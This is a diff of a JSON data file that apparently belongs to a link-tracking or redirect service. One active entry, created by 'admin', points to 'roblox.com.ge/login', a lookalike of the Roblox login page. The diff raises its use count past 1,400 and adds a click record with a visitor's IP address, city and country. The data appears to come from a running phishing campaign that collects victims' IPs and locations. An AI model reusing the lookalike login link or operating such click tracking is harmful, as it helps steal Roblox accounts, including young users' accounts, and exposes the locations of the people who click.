@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1414,
+    "useCount": 1415,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11478,6 +11478,14 @@
         "ip": "187.249.84.82",
         "country": "Mexico",
         "city": "Allende",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777428279129,
+        "ip": "177.245.110.41",
+        "country": "Mexico",
+        "city": "Tepic",
         "flag": "🇲🇽",
         "countryCode": "MX"
       }
